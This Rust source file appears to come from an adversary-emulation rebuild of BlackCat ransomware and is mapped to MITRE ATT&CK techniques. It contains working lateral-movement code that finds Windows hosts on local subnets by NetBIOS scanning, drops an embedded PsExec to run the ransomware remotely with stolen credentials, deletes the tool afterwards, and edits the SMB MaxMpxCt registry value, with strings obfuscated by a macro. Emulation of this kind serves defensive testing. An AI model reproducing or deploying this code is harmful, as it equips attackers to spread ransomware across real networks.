use super::nbtscan::ip_range::parse_ip_string;
use super::nbtscan::lib::scan;
use std::collections::HashSet;
use std::net::{Ipv4Addr, IpAddr};
use std::error::Error;
use winapi::um::winreg::{HKEY_LOCAL_MACHINE};
use crate::latmove::local_ips::get_local_ipv4_and_cidr;
use crate::logger::{log_error, log_info};
use crate::psexec::{cleanup_psexec, setup_psexec, run_psexec};
use crate::registry::set_reg_key_dword_value;
use encryptliterals::esl;

/**
 * propagate_via_psexec
 *      About:
 *          Drops embedded PsExec to disk, and then for each target IP in local_targets, spawn a PsExec process to execute
 *          BlackCat remotely using the provided credentials and BlackCat access token. Removes the dropped PsExec
 *          executable after processing all targets. If no targets are provided, PsExec will not be written to disk.
 *      Result:
 *          Propagation or Error should PsExec setup or execution fail.
 *      MITRE ATT&CK Techniques:
 *          T1570: Lateral Tool Transfer
 *          T1021.002: Remote Services: SMB/Windows Admin Shares
 *          T1569.002: System Services: Service Execution
 *          T1543.003: Create or Modify System Process: Windows Service
 *          T1070.004: Indicator Removal: File Deletion
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 *          https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/ 
 */
 pub fn propagate_via_psexec(local_targets: Vec<Ipv4Addr>, username: &str, password: &str, access_token: &str) -> Result<(), Box<dyn Error>> {
    if local_targets.len() == 0 {
        log_info(String::from(esl!("No local targets found to propagate to. Skipping PsExec propagation.")));
    } else {
        let success = setup_psexec();
        match success {
            Ok(_) => log_info(String::from(esl!("setup_psexec executed successfully"))),
            Err(e) => {
                Err(format!("{}: {}", esl!("setup_psexec failed"), e))?
            }
        };

        let targets = local_targets.iter().map(|x| String::from( x.to_string().trim())).collect::<Vec<String>>();
        let target_str = targets.as_slice().join(",");
        match run_psexec(target_str.clone(), username, password, access_token) {
            Err(e) => log_error(format!("{} {:?}: {}", esl!("run_psexec failed for targets"), target_str, e)),
            Ok(_) => log_info(format!("{} {}", esl!("run_psexec executed successfully for targets"), target_str))
        };

        match cleanup_psexec() {
            Ok(_) => log_info(String::from(esl!("Removed the dropped PsExec executable."))),
            Err(e) => log_error(format!("{}: {}", esl!("Failed to remove the dropped PsExec executable"), e))
        }
    }
    Ok(())
}

/**
 * update_maxmpxct_settings
 *      About:
 *          Updates (or creates if it does not exist) the Windows registry on the target system to increase concurrent network requests
 *          by setting the MaxMpxCt registry value to 65535 at the registry key HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters
 *      Result:
 *          Update MaxMpxCt registry to 65535 or an Error should registry key creation fail
 *      MITRE ATT&CK Techniques:
 *          T1112: Modify Registry
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 *          https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/ 
 */
 pub fn update_maxmpxct_settings() -> Result<(), u32> {
    set_reg_key_dword_value(
        HKEY_LOCAL_MACHINE,
        esl!("SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters").as_str(),
        esl!("MaxMpxCt").as_str(),
        65535u32,
        true
    )
}

/**
 * find_local_targets
 *      About:
 *          Finds the local network range(s) and uses NetBIOS requests to find Windows hosts that BlackCat can propagate to.
 *          If providing strict_include_scan_ranges, BlackCat will scan only those strict-include ranges that 
 *          are contained in the local network range(s)
 *      Result:
 *          A list of IPv4 addresses or an Error should network discovery or IP parsing fail
 *      MITRE ATT&CK Techniques:
 *          T1016: System Network Configuration Discovery
 *          T1018: Remote System Discovery
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 */
pub fn find_local_targets(allowed_ips: &Vec<String>, allowed_ranges: &Vec<String>) -> Result<Vec<Ipv4Addr>, Box<dyn Error>>  {
    log_info(String::from(esl!("Looking up target machine's local IPs and CIDR masks.")));
    let local_ip_ranges = get_local_ipv4_and_cidr()?;
    if local_ip_ranges.len() == 0 {
        log_info(String::from(esl!("No local IPs discovered. Skipping rest of network enumeration.")));
        return Ok(Vec::new());
    }
    log_info(format!("{}: {:?}", esl!("Target machine's local IPs and CIDR masks discovered"), local_ip_ranges));
    let connected_ips = match find_connected_ips(local_ip_ranges, allowed_ranges) {
        Ok(o) => o,
        Err(e) => {
            Err(format!("{}: {}", esl!("Failed to find connected IPs"), e))?
        }
    };

    // Filter out any IPs that aren't in the strict_include_targets config setting, if provided
    if allowed_ips.len() > 0 {
        log_info(format!("{}: {:?}", esl!("Filtering out any IPs not in the strict_include_targets setting value"), allowed_ips));
        let mut filtered_ips = Vec::new();
        for ip in connected_ips.iter() {
            if allowed_ips.contains(&ip.to_string()) {
                filtered_ips.push(*ip);
            }
        }
        Ok(filtered_ips)
    } else {
        Ok(connected_ips)
    }
}

fn filter_out_ips(ips: Vec<Ipv4Addr>, to_remove: Vec<Ipv4Addr>) -> Vec<Ipv4Addr> {
    let mut filtered = Vec::<Ipv4Addr>::new();
    for ip in ips.iter() {
        if !to_remove.contains(&ip) {
            filtered.push(*ip);
        }
    }
    filtered
}

/// Scans the provided (IP, netmask) range tuples and returns a vector of the responding IPv4 addresses. Will not scan the 
/// target machine's own IP addresses. If allowed_ranges is provided, only scan the intersection of allowed_ranges and 
/// provided range tuples.
fn find_connected_ips(range_tuples: Vec<(Ipv4Addr, u32)>, allowed_ranges: &Vec<String>) -> Result<Vec<Ipv4Addr>, Box<dyn Error>> {
    let deduped_and_filtered = dedupe_and_filter_ips(range_tuples, allowed_ranges);
    scan(deduped_and_filtered)
}

// Returns vector of IPv4 addresses based on the provided IPv4 CIDR ranges, without duplicate IPs and without
// local IPs. If allowed_ranges is provided, returns the intersection of allowed_ranges and 
// provided range tuples.
fn dedupe_and_filter_ips(range_tuples: Vec<(Ipv4Addr, u32)>, allowed_ranges: &Vec<String>) -> Vec<Ipv4Addr> {
    let mut local_ips = Vec::<Ipv4Addr>::new();
    let mut deduped_ips = HashSet::new();

    for range_tuple in range_tuples {
        if is_valid_prefix(&range_tuple) {
            local_ips.push(range_tuple.0);
            match parse_ip_string(format!("{}/{}", range_tuple.0, range_tuple.1).as_str()) {
                Ok(s) => {
                    for addr in s {
                        deduped_ips.insert(addr);
                    }
                },
                Err(e) => log_error(format!("{} {}/{}: {}", esl!("Error parsing CIDR range"), range_tuple.0, range_tuple.1, e))
            }
        } else {
            log_error(format!("{} {}/{}", esl!("Invalid range tuple"), range_tuple.0, range_tuple.1))
        }
    }

    // Intersect with allowed ranges
    if allowed_ranges.len() > 0 {
        let mut strict_to_scan = HashSet::new();
        for allowed_range in allowed_ranges {
            match parse_ip_string(allowed_range) {
                Ok(s) => {
                    for addr in s {
                        strict_to_scan.insert(addr);
                    }
                },
                Err(e) => log_error(format!("{} {}: {}", esl!("Error parsing strict-include CIDR range"), allowed_range, e))
            }
        }
        deduped_ips = deduped_ips.intersection(&strict_to_scan).map(|x| x.clone()).collect();
    }

    // Filter out our own IPs
    return filter_out_ips(Vec::from_iter(deduped_ips), local_ips);
}

/// Prefix is valid if
/// It is not a multicast IP
/// It is not a loopback IP
/// It is not 255.255.255.255
/// The subnet mask is not /32
fn is_valid_prefix(prefix:&(Ipv4Addr, u32)) -> bool {
    return !prefix.0.is_multicast() && !prefix.0.is_loopback() && prefix.0 != IpAddr::V4(Ipv4Addr::new(255, 255, 255, 255)) && prefix.1 != 32 && prefix.0 != IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)) && prefix.1 >= 16;
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::Ipv4Addr;


    #[test]
    fn test_is_valid_prefix() {
        let mut result = is_valid_prefix(&("10.0.1.0".parse::<Ipv4Addr>().unwrap(), 32));
        assert_eq!(result, false);

        result = is_valid_prefix(&("255.255.255.255".parse::<Ipv4Addr>().unwrap(), 32));
        assert_eq!(result, false);

        result = is_valid_prefix(&("127.0.0.0".parse::<Ipv4Addr>().unwrap(), 24));
        assert_eq!(result, false);

        result = is_valid_prefix(&("224.0.0.0".parse::<Ipv4Addr>().unwrap(), 24));
        assert_eq!(result, false);

        result = is_valid_prefix(&("10.1.2.0".parse::<Ipv4Addr>().unwrap(), 27));
        assert_eq!(result, true);

        result = is_valid_prefix(&("10.1.2.0".parse::<Ipv4Addr>().unwrap(), 0));
        assert_eq!(result, false);

        result = is_valid_prefix(&("10.1.2.0".parse::<Ipv4Addr>().unwrap(), 11));
        assert_eq!(result, false);

        result = is_valid_prefix(&("0.0.0.0".parse::<Ipv4Addr>().unwrap(), 0));
        assert_eq!(result, false);
    }

    #[test]
    fn test_filter_out_ips() {
        let ips = vec![
            Ipv4Addr::new(10, 192, 4, 1),
            Ipv4Addr::new(10, 192, 4, 2),
            Ipv4Addr::new(10, 192, 4, 3),
            Ipv4Addr::new(10, 192, 4, 4),
            Ipv4Addr::new(10, 192, 4, 5),
            Ipv4Addr::new(10, 192, 4, 6),
        ];

        let ips2 = vec![
            Ipv4Addr::new(10, 192, 4, 7),
            Ipv4Addr::new(10, 192, 4, 8),
            Ipv4Addr::new(10, 192, 4, 9),
            Ipv4Addr::new(10, 192, 4, 10),
        ];

        let to_filter = vec![
            Ipv4Addr::new(10, 192, 4, 1),
            Ipv4Addr::new(10, 192, 4, 4),
        ];

        let expected = vec![
            Ipv4Addr::new(10, 192, 4, 2),
            Ipv4Addr::new(10, 192, 4, 3),
            Ipv4Addr::new(10, 192, 4, 5),
            Ipv4Addr::new(10, 192, 4, 6),
        ];

        let expected2 = vec![
            Ipv4Addr::new(10, 192, 4, 7),
            Ipv4Addr::new(10, 192, 4, 8),
            Ipv4Addr::new(10, 192, 4, 9),
            Ipv4Addr::new(10, 192, 4, 10),
        ];

        let mut result = filter_out_ips(ips, to_filter.clone());
        assert_eq!(result, expected);

        result = filter_out_ips(ips2, to_filter.clone());
        assert_eq!(result, expected2);
    }

    #[test]
    fn test_dedupe_and_filter_ips() {
        let range_tuples = vec![
            (Ipv4Addr::new(10, 192, 4, 1), 29),
            (Ipv4Addr::new(10, 192, 4, 2), 29),
            (Ipv4Addr::new(10, 192, 4, 3), 29),
        ];

        let range_tuples2 = vec![
            (Ipv4Addr::new(10, 192, 4, 1), 29),
            (Ipv4Addr::new(10, 192, 5, 1), 30),
            (Ipv4Addr::new(10, 192, 4, 2), 30),
        ];

        let expected = vec![
            Ipv4Addr::new(10, 192, 4, 4),
            Ipv4Addr::new(10, 192, 4, 5),
            Ipv4Addr::new(10, 192, 4, 6),
        ];

        let expected2 = vec![
            Ipv4Addr::new(10, 192, 4, 3),
            Ipv4Addr::new(10, 192, 4, 4),
            Ipv4Addr::new(10, 192, 4, 5),
            Ipv4Addr::new(10, 192, 4, 6),
            Ipv4Addr::new(10, 192, 5, 2),
        ];

        let mut result = dedupe_and_filter_ips(range_tuples, &vec![]);
        result.sort();
        assert_eq!(result, expected);

        result = dedupe_and_filter_ips(range_tuples2, &vec![]);
        result.sort();
        assert_eq!(result, expected2);
    }

    #[test]
    fn test_dedupe_and_filter_ips_with_strict_range() {
        let range_tuples = vec![
            (Ipv4Addr::new(10, 192, 4, 1), 24),
            (Ipv4Addr::new(10, 192, 4, 2), 24),
            (Ipv4Addr::new(10, 193, 0, 3), 16),
        ];
        let range_tuples2 = vec![
            (Ipv4Addr::new(10, 192, 4, 1), 24),
            (Ipv4Addr::new(10, 192, 5, 2), 24),
            (Ipv4Addr::new(10, 193, 0, 3), 16),
        ];
        let range_tuples3 = vec![
            (Ipv4Addr::new(10, 0, 4, 1), 16),
            (Ipv4Addr::new(10, 192, 6, 2), 24),
            (Ipv4Addr::new(10, 193, 0, 3), 16),
        ];

        let strict_include_scan_ranges = vec![
            String::from("10.192.4.0/29"),
            String::from("10.192.5.0/29"),
        ];

        let strict_include_scan_ranges2 = vec![
            String::from("10.192.4.0/30"),
            String::from("10.193.5.0/29"),
        ];

        let expected = vec![
            Ipv4Addr::new(10, 192, 4, 3),
            Ipv4Addr::new(10, 192, 4, 4),
            Ipv4Addr::new(10, 192, 4, 5),
            Ipv4Addr::new(10, 192, 4, 6),
        ];
        let expected2 = vec![
            Ipv4Addr::new(10, 192, 4, 2),
            Ipv4Addr::new(10, 193, 5, 1),
            Ipv4Addr::new(10, 193, 5, 2),
            Ipv4Addr::new(10, 193, 5, 3),
            Ipv4Addr::new(10, 193, 5, 4),
            Ipv4Addr::new(10, 193, 5, 5),
            Ipv4Addr::new(10, 193, 5, 6),
        ];

        let mut result = dedupe_and_filter_ips(range_tuples, &strict_include_scan_ranges);
        result.sort();
        assert_eq!(result, expected);

        result = dedupe_and_filter_ips(range_tuples2, &strict_include_scan_ranges2);
        result.sort();
        assert_eq!(result, expected2);

        result = dedupe_and_filter_ips(range_tuples3, &strict_include_scan_ranges);
        assert_eq!(result.len(), 0);
    }
}
